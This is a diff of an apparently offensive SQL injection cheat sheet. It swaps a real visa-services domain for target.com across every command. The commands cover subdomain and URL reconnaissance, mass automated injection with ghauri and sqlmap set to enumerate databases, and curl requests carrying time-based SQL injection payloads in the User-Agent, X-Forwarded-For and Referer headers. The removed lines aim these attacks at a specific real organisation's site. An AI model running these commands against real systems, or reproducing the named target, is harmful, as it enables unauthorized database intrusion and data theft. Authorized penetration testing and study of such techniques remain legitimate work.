@@ -6,7 +6,7 @@
 **Single domain reconnaissance for potential SQL injectable endpoints**
 
 ```bash
-subfinder -d canadaonline.vfsglobal.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
+subfinder -d target.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
 ```
 
 **Multiple subdomain reconnaissance for SQL injection testing**
@@ -18,25 +18,25 @@ subfinder -d -l subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | gr
 **Discover potential SQL injectable parameters using gau**
 
 ```bash
-echo https://canadaonline.vfsglobal.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='
+echo https://target.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='
 ```
 
 **Alternative method for finding SQL injectable endpoints using katana**
 
 ```bash
-echo https://canadaonline.vfsglobal.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'
+echo https://target.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'
 ```
 
 **Mass SQL injection testing using ghauri**
 
 ```bash
-subfinder -d canadaonline.vfsglobal.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
+subfinder -d target.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
 ```
 
 **Comprehensive SQL injection testing using sqlmap**
 
 ```bash
-subfinder -d canadaonline.vfsglobal.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
+subfinder -d target.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
 ```
 
 ## Header-Based Injection
@@ -44,43 +44,43 @@ subfinder -d canadaonline.vfsglobal.com -all -silent | gau | urldedupe | gf sqli
 **Testing for time-based SQL injection via User-Agent header**
 
 ```bash
-curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://canadaonline.vfsglobal.com'
+curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://target.com'
 ```
 
 **Testing for time-based SQL injection via X-Forwarded-For header**
 
 ```bash
-curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://canadaonline.vfsglobal.com'
+curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://target.com'
 ```
 
 **Testing for time-based SQL injection via Referer header**
 
 ```bash
-curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://canadaonline.vfsglobal.com'
+curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://target.com'
 ```
 
 **Alternative User-Agent based SQL injection test**
 
 ```bash
-curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://canadaonline.vfsglobal.com'
+curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://target.com'
 ```
 
 **User-Agent header-based MySQL time-based injection**
 
 ```bash
-curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://canadaonline.vfsglobal.com'
+curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://target.com'
 ```
 
 **X-Forwarded-For header-based MySQL time-based injection**
 
 ```bash
-curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://canadaonline.vfsglobal.com'
+curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://target.com'
 ```
 
 **Referer header-based MySQL time-based injection**
 
 ```bash
-curl -H 'Referer: https://canadaonline.vfsglobal.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://canadaonline.vfsglobal.com'
+curl -H 'Referer: https://target.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://target.com'
 ```
 
 ## Database-Specific Payloads
